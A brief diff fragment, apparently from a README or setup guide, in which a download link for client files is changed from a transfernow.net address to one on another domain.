@@ -23,4 +23,4 @@ The first launch creates empty config file with comments. It should be populated
          client files
          client download
 	 
-https://www.transfernow.net/dl/20261026NOBBi3jR
+https://subs.eu-fffast.com/3c5b8529249c1974
